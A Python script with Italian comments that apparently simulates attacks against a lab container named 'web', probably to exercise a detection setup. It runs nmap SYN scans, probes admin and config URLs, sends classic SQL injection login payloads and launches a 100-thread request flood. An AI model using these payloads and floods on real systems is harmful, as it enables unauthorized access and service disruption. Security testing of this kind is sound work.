import requests
import time
import subprocess # Per eseguire comandi shell (nmap)
import threading # Per gestire thread paralleli (DDoS)
import urllib.parse # Per codificare caratteri speciali nelle URL

def simulate_unauthorized_access():
    """Simula tentativi di accesso non autorizzato"""
    print("\nSimulazione accessi non autorizzati...")
    malicious_urls = [
        'http://web:80/admin',
        'http://web:80/login?username=admin&password=1234',
        'http://web:80/config'
    ]
    
    # Intestazione HTTP personalizzata
    headers = {
        'User-Agent': 'MaliciousScanner/1.0'
    }
    
    # Tenta ogni URL tre volte
    for url in malicious_urls:
        for _ in range(3):
            try:
                print(f"Tentativo di accesso a {url}")
                response = requests.get(url, headers=headers)
                print(f"Status code: {response.status_code}")
                time.sleep(1)
            except Exception as e:
                print(f"Errore: {e}")

def simulate_port_scan():
    """Simula una scansione delle porte"""
    print("\nSimulazione port scanning...")
    try:
        for port in [80, 8080, 443, 22]:
            print(f"Scanning porta {port} su 172.18.0.2")
            subprocess.run(["nmap", "-sS", "-p", str(port), "web"], 
                         check=True, capture_output=True)
            # check=True solleva un'eccezione se il comando fallisce
            time.sleep(1)
    except Exception as e:
        print(f"Errore durante il port scanning: {e}")

def simulate_sql_injection():
    """Simula tentativi di SQL injection"""
    print("\nSimulazione SQL injection...")
    
    base_url = 'http://web:80/login'
    payloads = [
        "username=' OR '1'='1' --&password=any",
        "username=admin' UNION SELECT * FROM users--&password=any",
        "username=' OR 1=1 #&password=any",
        "username=admin' OR 1=1;--&password=any"
    ]
    for payload in payloads:
        try:
            url = f'{base_url}?{payload}'
            print(f"Tentativo SQL injection: {url}")
            response = requests.get(url)
            print(f"Status code: {response.status_code}")
            time.sleep(1)
        except Exception as e:
            print(f"Errore durante SQL injection: {e}")

def single_ddos_request(url):
    """Singola richiesta per il DDoS"""
    try:
        requests.get(url)
    except:
        pass

def simulate_ddos():
    """Simula un attacco DDoS"""
    print("\nSimulazione attacco DDoS...")
    url = 'http://web:80/'
    
    # Crea 100 thread per fare richieste simultanee
    threads = []
    for _ in range(100):
        # Ogni thread esegue la funzione single_ddos_request
        thread = threading.Thread(target=single_ddos_request, args=(url,))
        threads.append(thread) # Salva il thread nella lista
        thread.start() # Avvia il thread
    
    # Ripete l'attacco 3 volte
    for _ in range(3):
        for thread in threads:
            thread.join() # Aspetta che il thread finisca
        time.sleep(1)
        print(f"Inviate 100 richieste simultanee a {url}")

if __name__ == "__main__":
    print("Inizio dei test di sicurezza...")
    
    # Esegui ogni tipo di attacco separatamente
    simulate_port_scan()
    time.sleep(2)
    print("\n" + "="*50 + "\n")
    
    simulate_unauthorized_access()
    time.sleep(2)
    print("\n" + "="*50 + "\n")
    
    simulate_sql_injection()
    time.sleep(2)
    print("\n" + "="*50 + "\n")
    
    simulate_ddos()
    
    print("\nTest completati.")